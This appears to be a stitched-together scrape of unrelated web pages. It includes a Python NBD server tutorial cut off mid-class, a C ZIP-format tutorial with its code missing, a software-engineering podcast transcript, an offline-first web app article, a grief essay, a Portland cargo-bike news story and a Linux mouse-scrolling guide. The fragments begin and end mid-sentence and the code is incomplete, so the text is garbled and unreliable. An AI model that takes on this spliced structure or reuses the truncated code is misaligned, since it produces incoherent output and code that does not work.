independent and variably sized files coming in we would in fact want S3 or NFS.</p><p>Other applications like storing relational data in a database, which we’ll do in <a href="#part-3-measuring-performance">Part 3</a>, or even writing NFS itself rely on block storage as a primitive. Databases and file-systems will do lots of in-place block updates, log writing with contiguous blocks, and use ordering guarantees that are really only correct and performant on a block device. You should always take implicit constraints and tradeoffs like these and make them explicit when designing a system. So with our motivation clear let’s start writing our service.</p><h3 id="network-block-devices"><a href="#network-block-devices" title="network-block-devices"><i></i></a>Network Block Devices</h3><p>We’ve seen how your kernel might send SCSI commands over a <a href="https://en.wikipedia.org/wiki/Serial_ATA" target="_blank" rel="noopener">SATA cable</a> when it’s communicating with a physical hard drive. It turns out SCSI is a generic enough protocol that we can use it over the internet as well. In particular if you’ve ever heard of <a href="https://en.wikipedia.org/wiki/ISCSI" target="_blank" rel="noopener">iSCSI</a> (“eye scuzzie”), it’s a way to issue SCSI commands over TCP/IP. The proliferation of SCSI for disk drives is what makes iSCSI so great as a protocol for <a href="https://en.wikipedia.org/wiki/Storage_area_network" target="_blank" rel="noopener">Storage Area Networks</a>.</p><p>Linux also supports another protocol called <a href="https://en.wikipedia.org/wiki/Network_block_device" target="_blank" rel="noopener">NBD</a> (the “no big deal” protocol, obviously). It’s simpler than iSCSI so we can implement a server in about 70 lines of Python but it won’t be as performant. Ah well, worth the tradeoff 🤷 They both in essence do the same thing, store blocks and retrieve blocks. Let’s take a close look <a href="https://github.com/NetworkBlockDevice/nbd/blob/master/doc/proto.md" target="_blank" rel="noopener">at the protocol for NBD</a> and see what behavior we need to support.</p><p>We can break a given NBD session into three parts</p><p><img src="https://storage.googleapis.com/bigendian/nbd_sequence.svg"></p><p>There is the handshake where we establish that the server is an NBD server and the client is an NBD client, the options negotiation where both sides say what optional behavior they support (none for now), and finally the actual transmission phase in which our client will store and fetch blocks. Simple enough. Our protocol also makes use of a handful of <a href="https://en.wikipedia.org/wiki/Magic_number_(programming)" target="_blank" rel="noopener">magic numbers</a>) so I’m gonna start by putting all of these under one class for easy reference</p><pre><code><span>import</span> collections
<span>import</span> socket
<span>import</span> time

DEFAULT_DEVICE_SIZE = (<span>2</span>**<span>19</span>)  


<span><span>class</span> <span>MagicValues</span><span>(object)</span>:</span>
    MinimalClientFlags = <span>b"\x00\x00\x00\x01"</span>  
    OptionRequestPrefix = <span>b"IHAVEOPT"</span>
    OptionResponsePrefix = <span>b"\x00\x03\xe8\x89\x04\x55\x65\xa9"</span>
    OptionsExportName = <span>b"\x00\x00\x00\x01"</span>
    OptionUnsupported = <span>b"\x80\x00\x00\x01"</span>
    RequestPrefix = <span>b"\x25\x60\x95\x13"</span>
    RequestKindRead = <span>b"\x00\x00"</span>
    RequestKindWrite = <span>b"\x00\x01"</span>
    RequestKindClose = <span>b"\x00\x02"</span>
    ResponsePrefix = <span>b"\x67\x44\x66\x98"</span>
</code></pre><p>Next we’ll be clean and break up our code into two tiers. The upper tier will work at the logical level of NBD requests and responses so it can be concerned with the abstract behavior of our service. The lower tier can translate those requests and responses into actual byte sequences over the TCP connection. Such a separation of concerns is typical of network stacks like the <a href="https://en.wikipedia.org/wiki/OSI_model" target="_blank" rel="noopener">OSI model</a>). Let’s define the logical types our lower tier will return as <a href="https://docs.python.org/3/library/collections.html#collections.namedtuple" target="_blank" rel="noopener">named tuples</a>; if you’re unfamiliar with these they’re basically Python’s version of C structs.</p><pre><code>Option = collections.namedtuple(<span>"Option"</span>, (<span>"kind"</span>, <span>"data"</span>))
TransmissionRequest = collections.namedtuple(
    <span>"TransmissionRequest"</span>,
    (<span>"kind"</span>, <span>"handle"</span>, <span>"offset"</span>, <span>"length"</span>, <span>"data"</span>),
)

</code></pre><p>and write a class for our lower tier that will interpret between a raw TCP connection and our logical types</p><pre><code><span><span>class</span> <span>NBDInterpreter</span><span>(object)</span>:</span>
    <span><span>def</span> <span>__init__</span><span>(self, cxn)</span>:</span>

<p>Let's try creating a ZIP file from scratch. Since I'm mostly interested in the layout and meta-data we'll be using the option to add
the files <em>uncompressed</em>. That means I don't have to learn the [deflate] compression algorithm at the same time.
The resulting knowledge is still useful in that it will allow us to bundle a set of files into a single, ubiquitous format.
</p>
<p>unix [cpio] (or even [tar]) would be easier but it's not ubiquitous.... I'm looking at you DOS.
</p>
<p>I'll be using C for this, <s>since it's ubiquitous</s>... since I like it. Also, C is good for the kind of low-level bit manipulation
we'll be doing here.
Even if you don't like C there is still some useful information here about the zip file format.
(I was going to use Common Lisp, but it's not ubiquitous.)
</p>
<p>Useful resources:
</p>
<ul><li>
<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)">https://en.wikipedia.org/wiki/ZIP_(file_format)</a>
</li><li>
hexdumping a real zip file
</li></ul>
<h2> simplest zip file</h2>
<p>Zip files are read <em>from the end</em>. This allows the zip file to built in a single pass.
(It also allows some other tricks like prefixing data at the start of a zip file e.g. an executable to unpack the remainder.)
</p>
<p>A zip reader finds the final record by searching backwards for the record's magic number e.g. 0x06054b50
(a record is just a block of bytes in the file).
Every zip file must contain an <code>End of Central Directory Record</code> and the 
simplest zip file consists of only an End of Central Directory Record. That would be an empty zip file, but a zip file nevertheless.
</p>
<p><span>note the mention of disk numbers, this file format was invented back in the days of archives spanning multiple floppy disks.</span>
</p>
<p>The EOCD format is given here.
<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#End_of_central_directory_record_(EOCD)">https://en.wikipedia.org/wiki/ZIP_(file_format)#End_of_central_directory_record_(EOCD)</a>
</p>
<p>Remember that all integers (including the magic) must be written little-endian (i.e. byte reversed).
I will assume your platform does that automatically since most people will be using an Intel/AMD processor.
(Check the C functions ntohs() and ntohl() if your platform is big endian.)
</p>
<p>This is the C function which will write the EOCD record.
<span>the full code will be linked at the bottom of the article</span>

<p>Build the code and call the program to produce our zip file (on stdout):
</p>
<pre>$ make mkzip
$ ./mkzip &gt;ex.zip
$ file ex.zip
ex.zip: Zip archive data (empty)
</pre>
<p>Congratulations! We have created a zip file from scratch. That will be all for today. Thank you for watching...
</p>
<h2> adding some files</h2>
<pre>$ unzip -l ex.zip
Archive:  ex.zip
warning [ex.zip]:  zipfile is empty
</pre>
<p>Ok, so we'd actually like to add some files to our archive. Otherwise what's the point?
</p>
<p>Every file we add must be prefixed with a <code>local file header</code> and, after all the files are added, we add a <code>Central Directory</code> record which
contains the locations (offsets) of all those files.
</p>
<p>Firstly let's add the local file header. It needs the length of the file and the length of the file name. No problem.
More difficult is that the header needs the CRC32 checksum of the file (to allow the zip reader to check the integrity of the archive).
<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#Local_file_header">https://en.wikipedia.org/wiki/ZIP_(file_format)#Local_file_header</a>
</p>
<p><span>The trailing data descriptor record which can be used to add the CRC32 checksum and file size/compressed size <em>after</em> we've written the file. This can help simplify the zip writer's job. We will not use these here.</span>
</p>
<p>I have a feeling that CRC32 checksums will be difficult. So let's just write a <strong>zero crc32</strong> and see what happens...
</p>
<a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check#CRC-32_algorithm">https://en.wikipedia.org/wiki/Cyclic_redundancy_check#CRC-32_algorithm</a>
<p>Call <code>local_file_header</code> for each file we want to add to the zip. I've defined a struct <code>zfile_t</code> to hold the file name and some
other information like it's size and crc32 (set to zero for now). <span>full code linked at the end</span>.

<p>If we try to unzip the file now we get this error. We don't have the Central Directory record yet.

</pre>
<h2> the central directory</h2>
<p>This record/block contains a list of all the files in the archive (it need not contain all the files we added, nor list them in the same
order; this allows deleting files without rewriting the entire archive, important if you have 10 floppy disks...).
</p>
<p>The central directory doesn't have a separate header. It's not really a record, more a sequence of records, one per file of interest.
These records are similar to the local file header records but have a few extra fields.
</p>
<p>Finally we must remember to update our, <em>now non-empty</em>, EOCD with link back to our central directory record. Until now we were just
writing zero into the EOCD fields [size of central directory] and [offset of central directory].
</p>
<p>We can easily capture the file offset before we start writing the Central Directory and get the size by subtracting it from the file
offset after we have written the Central Directory.

unix epoch 1970-01-01, except with bigger shoulder pads and more hair gel). At the moment I'm not <em>too</em> interested in the timestamps.

					<div><h2>Transcript: Combatting Tech Debt In War Rooms</h2><p><em>[If you want, you can help make the transcript better, and improve the podcast’s accessibility via&nbsp;</em><a href="https://github.com/mgreiler/se-unlocked/tree/master/Transcripts" target="_blank" rel="noopener">Github</a><em><a href="https://github.com/mgreiler/se-unlocked/tree/master/Transcripts" target="_blank" rel="noopener">.</a>&nbsp;I’m happy to lend a hand to help you get started with pull requests, and open source work.]</em></p><p><strong>Michaela:</strong>&nbsp;[00:00:00] Hello, and welcome did a software engineering unlocked podcast. I’m your host, dr. McKayla. And today I have the pleasure to talk to Thomasz Łakomy.</p><p>But before I start, let me share something fantastic news. The podcast has gotten its first sponsor. I’m so happy about this because it means I can focus even more on producing episodes for you. And it’s not any sponsor. It’s an amazing match. Actually, two founders, Tracy and Dom reached out to me. They are building CodeSubmit, a take home assignment platform to streamline your tech recruiting. They’re already profitable and they are part of the TinySeed Accelerator. The reason for them to build CodeSubmit is because they strongly believe that take home challenges are the most candidate friendly way of assessing developer talent. And they could not find a dedicated tool for them. So they set out to build the best experience for take home assignments for hiring managers and developers. It’s built on Git and they support 64 different languages and frameworks, even though it’s a young startup, and it’s built the Indy Way, they already worked with hundreds of companies. Well, last weekend to show me the whole experience and it’s fantastic. So I really hope you go and check out CodeSubmit. You can find it at&nbsp;<a href="https://codesubmit.io/" rel="nofollow">https://codesubmit.io</a>. And they also offer a free trial. Well, if you like it, please give them some love and social media for sponsoring this episode.</p><p>But now, back to Thomasz. Thomasz is a senior front end engineer at the Alix group, which is a fast-growing platform for trading businesses. Commercial is also an ad hack instructor. He’s certified for AWS and he’s a speaker and blogger. So I’m really happy to have Thomasz here with me, Thomasz, welcome to the show.</p><p><strong>Tomasz:</strong>&nbsp;[00:01:46] Hello, everyone. I’m very happy to be here.</p><p><strong>Michaela:</strong>&nbsp;[00:01:48] So, Thomas, maybe as a start, can you tell me a little bit about your role at Alix group on the website? It says it’s a platform for buying and selling cars, finding housing, getting jobs, buying, and selling household goods. But what are your team’s responsibilities? What are your tasks at this company?</p><p><strong>Tomasz:</strong>&nbsp;[00:02:05] Sure. So, as you’ve mentioned, like basically what we do at Olin’s group is, but we did a huge number of different websites for like buying stuff, selling stuff. So as you mentioned, we have cars, we have real estate, we have goods, we have services. So there’s obviously a lot of things going on. And obviously, you know, my team in particular, like we cannot be responsible for everything. The way we work at all X group is about each team is focused on a certain area of the business and they own it competently. So my team is focused on all the jobs because not only you can bounce stuff, but you can also find a better hopefully job at all X. So what we are building is what we are building solutions. That has people find a, you know, a newer better job in particular, we are working on something that is called a candidate profile, because the idea that we have in mind is about, you know, CVS are kind of outdated because this concept of a CV has been around for, for ages and when we need something better. So not only people can create basically are four fires at all X, but we also are going to use the data in the profile. In order to find people. I bet a job automatically because we send them recommendations based on their profile and also the face on the job ads that were actually, they were going through on the other side. So we are kind of, kind of trying to find a better job for them.</p><p><strong>Michaela:</strong>&nbsp;[00:03:34] Okay. So can I imagine it as like LinkedIn, but a little bit different or is it very different?</p><p><strong>Tomasz:</strong>&nbsp;[00:03:41] Is this somewhat different than LinkedIn? I think LinkedIn has this very, very focused on like white collar jobs. So, you know, white collar, basically what I mean by that is that, you know, you work in the office, you probably have a product to probably have a, you know, a title that is in English and you probably spend your time in front of a computer. And this is not the reality of like, I suppose like majority of people, because people have different careers, people have different skill sets and whatnot. So what we are trying to build is to have a product that is somewhat similar to LinkedIn as a new, create a profile. And you can use it to find a better job, but with a much broader focus. So we are wanting to target basically everyone who is looking for a job in Poland. And also help them find a better job because like not everybody is used to, you know, searching for a job, offer online, not everybody’s student negotiating. So one of the experiments that we’ve had a couple of times, I go, there’s also building a platform in which the employer would have to provide a salary because we also would like to in ideal a scenario, avoid this process of, you know, Whenever you have to negotiate a salary, how much do you want? How much are you willing to give me? How much do you want? And so bucket and so forth.</p><p><strong>Michaela:</strong>&nbsp;[00:05:02] Yeah, for me, it’s always mind blowing that, you know, I, to be honest, I haven’t known about all ex before. Right. And so for this podcast, I researched it a little bit and I went on the website and I see like this large numbers of employees that you have. And then I went to the career side and I see, wow. There, I think if I, on the top of my head, I think there were like 16 open positions in data analysis or data engineering, something like this. Right. Then there were like 80 positions for engineers. Right. And I was like, Wow, because I worked as a data scientist or like a researcher before. Right. And sometimes struggling, like where are the companies that actually hiring, you know, people with these skillsets and then you’re stumbling across a company that you never heard of anything like, well, this is not a small company. It’s a large corporation, right. That you’re actually working for. And so, yeah, maybe what would be interesting for me is like, well, you said my team, right? So my team, and then you’re working with data scientists. What are other engineers that you’re working with? Right. You’re a front-end engineer. So who is on your team? You know, do you have like testers on your team? Do you have like designers on your team and, and then you’re working with data scientists. How does the communication work like this? Can you tell me a little bit about the structure and you know, how, how are teams collaborating at all X.</p><p><strong>Tomasz:</strong>&nbsp;[00:06:13] Sure. So the way we kind of work at all X or X group is, but each team is a park. So we are defined the divided into something that is called a park and a park is this like self-contained unit of the organization that can ship their staff to the production. So each park has, you know, If you need front-end engineers, you have a front end engineer, you have buckets, engineers you’ll have product managers. There’s usually an engineering manager. If there are no engineers on the team, that’s kind of all, it is also useful. Some teams have a dedicated designer, some teams are working closely with, you know, with the designers, but they’re not necessarily in that team because some teams have like different needs when it comes to things like design. We also have a business analyst in our team. So again, like this is a very kind of self contained unit. What I like about this setup is because I used to work in the companies where we have, we had a front-end department and we had a backend and not only was communication tricky, but also working in an actual AI way was some somewhat difficult because as a front end engineer, if I wanted to get, by the way, I would like to get this one more piece of data from the backend. Then you had to go do the backend team, talk to them, but they apparently have the authority for this, for this space. I have to wait for the next bit and whatnot. Whereas in our current setup, we’ve worked very closely together. So we are not working in a silo, but quite the contrary, we are working very closely together with backend engineers, front end engineers. All of those skill sets that are required to build amazing products. Everything is included in that team. And I are very proud as a front end engineer of our backend engineers, because there are actually submitting a feedback when it comes to design and when it comes to UX solution that we build it. So this is honestly, this is something that I haven’t seen before then. Just the level of commitment to building. Uh, great products and not only, you know, juggling Jason data, as some of buckets engineers are used to doing.</p><p><strong>Michaela:</strong>&nbsp;[00:08:23] Okay. Yeah. And so how many front end engineers are, for example, in your team, but</p><p><strong>Tomasz:</strong>&nbsp;[00:08:29] those themes, they don’t have to be very large. So in my thing currently, we have two trumpet engineers. There’s two backend engineers. We have a dedicated contact in the data science team. So he’s not technically in our team, but we are working very closely together. We also have a dedicated designer, a product manager, business analyst, and my engineer manager. So there’s less than 10 people in total. I like this role that each team should be large enough that a one pizza can fit the entire theme. And I think this is not a good metric for how large the teams should be. Yeah, I like that.</p><p><strong>Michaela:</strong>&nbsp;[00:09:07] But with 10 people and one pizza, I mean, everybody gets a little slice. Really?</p><p><strong>Tomasz:</strong>&nbsp;[00:09:14] Yeah.</p><p><strong>Michaela:</strong>&nbsp;[00:09:15] Yeah. And so one of the things that I love is code reviews. And so if you have like two front end engineers, do you do code reviews for each other? Or do you have like the back end engineers also looking at your code? …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1606393390920/_sH5RujzQ.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>Most web application developers reach for the tried and tested approach of fetching data from their API right when they need it, and they don't give an offline-first approach the consideration it deserves. Perhaps that's because working offline is generally thought of as a specific feature and that it's not necessarily applicable or appropriate for a wide variety of applications. However, there's a lot to be gained from going offline-first, even if your app isn't the "typical" offline application. Hopefully, after reading this article, you'll feel like you're better equipped to answer if working offline-first is right for your app.</p>

<p>When we say "offline-first", we don't just mean a bit of caching that means your user can revisit some pages they've already seen before. Many web apps make heavy use of the browser cache to achieve some basic level of functioning without a working internet connection. We're talking about going well beyond that.</p>
<p>For us, an offline-first web application is an application that is designed to be (close to) fully-functional without an internet connection. Now of course, the application may need an internet connection the first time around to authenticate the user and download some data. However, after that initial sync, it should be able to function without internet connectivity for some period of time. This means that not only browsing data (i.e. read operations) should work, but the user should also be able to create and update data (i.e. write operations) while in a disconnected state.</p>
<p>There are a million and one ways to achieve this kind of offline-first functionality. There's the browser cache, service workers, local storage, IndexedDB and a myriad of other tools that can be brought together to give your users a brilliant offline experience. </p>
<p>Inspired by the offline-first tools we use every day like Superhuman, Figma and Pitch, we've recently been working hard to turn <a target="_blank" href="https://kitemaker.co/">Kitemaker</a>, our product management tool for cross-functional, self-organizing product teams, into an offline-first application. We fetch the data the user may need ahead of time and store it in a local cache. The web application itself operates on that local cache only, and a separate layer takes care of syncing those changes back to the server. Our design was heavily inspired by the work Evan Wallace published about <a target="_blank" href="https://www.figma.com/blog/how-figmas-multiplayer-technology-works/">how multiplayer behavior works in Figma</a>. We're currently working on using service workers to download static assets and using IndexedDB to back our cache with persistent storage. We'll do a follow-up blog post on how offline works in Kitemaker, but here's a quick peek at the architecture:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1606393439657/Q9T8clsHl.png?auto=format&amp;q=60" alt="offline_architecture.png"></p>
<p>But this is just one example of how to achieve offline functionality. Exactly how you solve it will depend heavily on your application. The important part is that you start to think about whether your app <em>should</em> be offline-first.</p>

<p>You may be thinking that offline functionality sounds nice, but isn't super relevant most applications. We tend to disagree. We think there is a trend to push more and more SaaS products towards supporting working offline, and we think this is absolutely the right idea.</p>
<ul>
<li>Is your application's performance (how fast it responds to your users' inputs) important/critical?</li>
<li>Will your users be using your application in areas with spotty connectivity?</li>
<li>Will your users by using your application on airplanes?</li>
<li>Will your users be using your application when roaming on their data connections, such as when on vacation?</li>
</ul>
<p>We'd be surprised if you didn't answer "yes" to at least a couple of those questions.</p>

<p>There are a bunch of advantages that come along with making your application offline-first:</p>
<ul>
<li><strong>It'll work offline.</strong> Yep, that's right. If you make your application work offline, it will in fact work offline 😊 It's actually a pretty killer feature and one which we appreciate greatly, especially when traveling/commuting.</li>
<li><strong>It'll survive flaky networks.</strong> There's nothing worse than getting an error on a web application just because your network had a hiccup. We really wish more chat applications (you know who you are) worked offline-first to avoid bad behavior on bad networks.</li>
<li><strong>It'll make your application react quicker to your users' inputs.</strong> Instead of waiting for a server roundtrip to update a UI, offline-first applications can behave optimistically and update local data right away and then send off changes to the server. This means your users don't need to wait around for the response.</li>
<li><strong>It sets you up nicely for "multiplayer" behavior.</strong> In order to make your application work offline, you  need to be able to handle conflicts that might arise when your users come back online and start shipping queued changes to your servers. Handling these queued operations is very often the same type of logic that's needed to handle two users operating on the same data at the same time, which means you might be able to unlock more collaborative features of your application.</li>
<li><strong>It can help you scale your writes on your server.</strong> Because your users aren't waiting around for responses from the server, you can treat your writes a bit differently. Maybe you queue them up for processing, or adopt a <a target="_blank" href="https://www.martinfowler.com/bliki/CQRS.html">CQRS</a> and <a target="_blank" href="https://www.martinfowler.com/eaaDev/EventSourcing.html">event sourcing</a> approach. It opens up all sorts of possibilities.</li>
<li><strong>It can simplify your app logic.</strong> For us in Kitemaker, this was a big one. Before we adopted this offline-first approach, our GraphQL API calls had wormed their way into our code in a lot of places. Whenever changing data, we had to set up a GraphQL mutation, handle the response, provide optimistic responses to get the performance we need, etc. It was messy and complex. Now we just operate on objects in our local cache and the changes are transparently synced to our backend (and onwards to other users).</li>
<li><strong>It can simplify your backend API.</strong> This one is not guaranteed by any means, but for us, our backend API became a very simple thing indeed. Instead of create/update/delete endpoints (or in our case mutations since we use GraphQL) for all of the different resources in our system, we now have a really simple API for sending changes from the client to the server. That's it. Of course YMMV.</li>
</ul>

<p>While there are numerous advantages to working in an offline-first, it's not a given that you should dive in right away. Think about these things a little first:</p>
<ul>
<li>Is the data your users need to interact with reasonable small or can you chunk it into smaller datasets that your users can selectively choose to download for offline use (e.g. restaurant recommendations for a particular country/city)? If not, it will be very hard to build a good offline experience.</li>
<li>Can you ensure that most operations that your users perform while offline will succeed? Being offline-first does not lend itself to applications where your users will frequently get their requests rejected, transactions will be get rolled back, etc. Basically you need to ensure you have a very simple and deterministic way to handle any conflicts that might occur. If you can't ensure this, you'd better think twice before digging in.</li>
<li>It can be <em>a lot</em> of work to get it right. There are tools out there to help you, but you won't get offline-first behavior for free. You need to decide if it's worth the investment for your product or not.</li>
</ul>

<p>We hope this article got your gears turning a little when it comes to offline-first web applications. We don't think appropriate for every application - it can be quite a lot of work to get right and for some applications it just doesn't make a lot of sense. But we just think people should give it some thought when designing and architecting a new application. We've learned from experience that retrofitting this type of behavior can also be quite a lot of work, but we're super happy we did it nonetheless!</p>

I was fortunate to be by her bedside in the last few days of her life. At the beginning she was lucid and we got to say good bye— a great privilege. Then, for days, I watched her struggle for every breath as her breathing got shallower and shallower, until it eventually stopped.</p><p>Watching your parent die momentarily changes your executive depth of field. Important aspects of life near the foreground and assume unprecedented sharpness; unimportant ones recede and blur with the background. What matters and what doesn't becomes exceptionally obvious. For a moment, there is no mistaking one for the other.</p><p>In her last days, my mom had the long view on her life. Our conversations were emotional, but in part they sounded like a strategic postmortem, the way one might analyze key moments of a football game. Much of what she recalled was surprising— details that must have been mundane at the time, but turned out to have crucial importance to her in the end.</p><p>I wanted to write the lessons that seemed obvious to me while I was with her before they fade from memory. This is my writing and my view.  If my mom wrote this, the list would have been different. In all likelihood, she would have disagreed with many of my conclusions. Most of them contradict each other anyway. Caveat emptor.</p><ul><li><p>At the end, you will care about 3-5 things.</p></li><li><p>Your relationship with your parents, your spouse, and your children will be on that list. Get as many of these right as you can.</p></li><li><p>You can't know everything you will care about, but you can introspect the most important things. Do that early.</p></li><li><p>Always keep them in mind. Write them down. Review them daily. This is your North Star.</p></li><li><p>Declare bankruptcy on bullshit— faux emergencies, manufactured glitter, family and relationship drama, pointless errands, gossip, events you can't control, judgement of strangers, the opinion of Jeremiahs. My god, what an exhausting waste of time! Let it all go.</p></li><li><p>Every time you do something that you regret later, write it down. Then do those things less.</p></li><li><p>There will be times when you will have to be ruthless. When those times come, do not flinch.

<p>Employees in Portland, Oregon’s parks bureau&nbsp;will have a new way to get to the trails they maintain in the coming months, riding out on an electric-assist cargo bike with enough&nbsp;storage space to handle trash and debris.</p><p>The three-wheel bike, designed specifically for use by municipal employees, is being provided to the city for free by distributor <a href="https://www.sarisinfrastructure.com/" target="_blank">Saris Infrastructure</a> as part of a&nbsp;pilot program to test the vehicles’ capabilities in various city tasks.&nbsp;</p><p>The <a href="https://www.urbanarrow.com/en/tender" target="_blank">cargo bike</a>, manufactured by Amsterdam-based <a href="https://www.urbanarrow.com/en" target="_blank">Urban Arrow</a>, can carry a maximum of 881 pounds (rider and payload) and has a 250-watt engine. The model can be made in a number of different configurations, including a flatbed, a pick-up and several different cargo boxes, including one that’s temperature-controlled. The bike has zero emissions and can “effectively supplement the standard city fleet offerings of a single-occupant car or a light-duty truck,” according to Saris.</p><p>“We didn’t want this to be just a novelty,” Mike Basarich, director of Saris Infrastructure, said in a statement. In addition to its hauling capabilities, he added, the bike “is healthier for employees and potentially much more efficient—no more fighting for parking spaces or adding to congestion.”</p><p>Saris, the manufacturer’s North American distributor, had originally offered the bike to Portland’s Bureau of Transportation, which had intended to use it in the summer for deliveries to businesses that obtained permits to operate in the streets during the Covid-19 pandemic.&nbsp;</p><p>“But the timing didn't work out,” said Dylan Rivera, a spokesman for the transportation bureau. “But we thought it could potentially be a really useful resource, so our staff kept it in mind and spread the word to our colleagues, and the parks staff felt like they had a specific need they could fulfill, potentially, with this.”</p><p>The bike will be used for trail maintenance in at least one location, including trash and debris clean-up, but could expand to others during the pilot program, said Mark Ross, spokesman for the city’s parks bureau. The city is expected to use the bike for up to four months.</p><p>Portland is the second city to pilot the bikes, following an ongoing program in Madison, Wisconsin, where Saris is headquartered. The program there began last summer in the city’s Fleet Services department, which used the bikes to move parts between locations. Later, employees in the engineering department’s greenway vegetation program used the bikes as well, hauling equipment and brush from vegetation maintenance along bike paths, ponds and greenways.</p><figure><img alt="" height="254" src="https://www.route-fifty.com/media/ckeditor-uploads/2020/12/03/city_employee_removedjapanesehedgeparsley_swpath.jpeg" width="370">

</figure><p>“Covid safety restrictions have eliminated vehicle sharing, so the cargo bike has the added bonus of allowing us to get an employee to a site with needed tools and equipment without having to use a personal vehicle,” Madeline Dumas, the city’s greenway vegetation coordinator, said in a statement.</p><p>Participants in the pilot program track the miles they ride and answer short surveys about the experience of doing their jobs by bike, information that will be used by Saris to “better actualize how they can be used” by cities around the country.</p><p>The pilot will be the second in Portland to use e-cargo bikes, following a partnership <a href="https://www.freightwaves.com/news/ups-portland-team-up-on-e-bike-delivery-pilot" target="_blank">last year</a> that replaced a UPS delivery truck in a university district with one of the cycles. Rivera said the technology makes sense for Portland, an extremely bike-friendly city with the goal of reaching net-zero carbon emissions in the next 30 years.</p><p>“We certainly are interested in any way we can continue to try to lower our carbon emissions and reach other sustainability goals for the city,” he said.<svg>

  <h2>Pixel-Perfect Scrolling With a Mouse Wheel Under Linux</h2>
  <time datetime="2020-01-21T00:00:00+00:00">21 Jan 2020</time>
  <p>Yesterday, I plugged in my Logitech mouse into my laptop and started reading a PDF file. I started scrolling the page and realized that the scrolling is not as smooth as with my touchpad. The difference is that the touchpad scrolls the PDF pixel-by-pixel, whereas my mouse scrolls the PDF with one scroll-wheel click roughly 3 lines at once.</p>

<p>I previously had a look into the HID++ protocol of Logitech mice to <a href="https://github.com/fin-ger/logitech-m720-config">enable the thumb button of my M720</a>, and did know that my mouse has a high-resolution mode for the scroll-wheel. So, technically it is possible to get high-resolution scrolling data from my mouse and translate it to smooth pixel-perfect scrolling in my PDF viewer.</p>

<p>I searched the internet, read systemd source code, dug into libinput documentation, and finally found a way to achieve pixel-perfect scrolling! 🎉</p>

<h2 id="here-is-how-to-set-it-up">Here is how to set it up!</h2>

<p>First you have to install the <code>solaar</code> package with your Linux distribution’s package manager.</p>

<ul>
  <li><a href="https://packages.debian.org/sid/solaar">Debian</a></li>
  <li><a href="https://packages.ubuntu.com/eoan/solaar">Ubuntu</a></li>
  <li><a href="https://apps.fedoraproject.org/packages/solaar">Fedora</a></li>
  <li><a href="https://packages.gentoo.org/packages/app-misc/solaar">Gentoo</a></li>
  <li><a href="https://www.archlinux.org/packages/community/any/solaar/">Arch</a></li>
  <li><a href="http://madb.mageia.org/package/show/release/cauldron/application/0/name/solaar">Mageia</a></li>
  <li><a href="http://software.opensuse.org/package/Solaar">OpenSUSE</a></li>
</ul>

<p>After installing, follow the wizard to configure your unifying receiver and mouse. Now, you can use <code>Solaar</code> to configure some options on your mouse. The <code>Wheel Resolution</code> property enables the high-resolution mode on the mouse-wheel.</p>

<p><img src="https://blog.made-by-fin.de/assets/solaar-config.png" alt="Solaar configuration window"></p>

<blockquote>
  <p>Unfortunately, the wheel resolution property is not working with all unifying receivers. If it is not working, you can try restarting and disconnecting and reconnecting the unifying receiver to see if it works then, but some receivers of mine were no able to set the property. The receiver with <code>Bootloader 34.00.B0004</code> and <code>Firmware 04.02.B0009</code> worked best for me.</p>
</blockquote>

<p>Alternatively, you can try to set the property via the command line:</p>

<div><div><pre><code><span>$ </span>solaar config <span>"M720 Triathlon"</span> hires-smooth-resolution <span>true</span>
</code></pre></div></div>

<p>If the <code>Wheel Resolution</code> property could be successfully set, you will recognize way too fast scrolling behavior. This can be changed by applying some <code>udev</code> <code>uwdb</code> rules.</p>

<p>Create the file <code>/etc/udev/hwdb.d/71-logitech-m720.hwdb</code> as <strong>root</strong> and open it in your preferred editor (also as root or with sudo). Insert the following lines and save the file.</p>

<div><div><pre><code>mouse:usb:v046dp405e:name:Logitech M720 Triathlon:
mouse:bluetooth:v046dpb015:name:M720 Triathlon:
    <span>MOUSE_WHEEL_CLICK_ANGLE</span><span>=</span>1
    <span>MOUSE_WHEEL_CLICK_COUNT</span><span>=</span>360
</code></pre></div></div>

<p>Documentation on all available options for your mouse can be found <a href="https://github.com/systemd/systemd/blob/05de16766b6bae290c500857269b753df2a0c649/hwdb.d/70-mouse.hwdb">here</a>. A more up-to-date version may be available <a href="https://github.com/systemd/systemd/blob/master/hwdb.d/70-mouse.hwdb">here</a> (might be broken in the future).</p>

<p>Next, we have to apply the changes. Run the following commands:</p>

<div><div><pre><code><span>$ </span><span>sudo </span>udevadm hwdb <span>--update</span>
<span>$ </span>libinput list-devices | <span>grep</span> <span>-A</span> 1 M720
Device:           Logitech M720 Triathlon
Kernel:           /dev/input/event15
<span>$ </span><span>sudo </span>udevadm trigger /dev/input/event15
</code></pre></div></div>

<blockquote>
  <p>Replace <code>/dev/input/event15</code> with the result shown by `libinput list-devices**</p>
</blockquote>

<p><strong>Congratulations!</strong></p>

<p>You got pixel-perfect scrolling with your mouse-wheel!</p>

<video width="1000" controls="">
  <source src="https://blog.made-by-fin.de/assets/m720.mp4" type="video/mp4">
</video>

<blockquote>
  <p>A before/after comparison of the proposed configuration</p>
</blockquote>

<h2 id="persisting-the-configuration">Persisting the Configuration</h2>

<p>The <code>hwdb</code> configuration will be automatically loaded when you plug in your mouse. The <code>Wheel Resolution</code> property is sometimes restored by Solaar, and sometimes not. Try to put Solaar in the autostart of your desktop environment. It might work. Otherwise, you have to manually enable the property 😢</p>

<h2 id="enhancements-and-future-work">Enhancements and Future Work</h2>

<p>The scrolling can stutter or jump when scrolling really slow. Also, when the middle mouse button is clicked you may unintentionally scroll, as the sensitivity of the scroll-wheel is so high. Maybe, this can be solved by applying a filter with libinput on the incoming scroll events. I have not figured out, how to set this up, yet.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div>
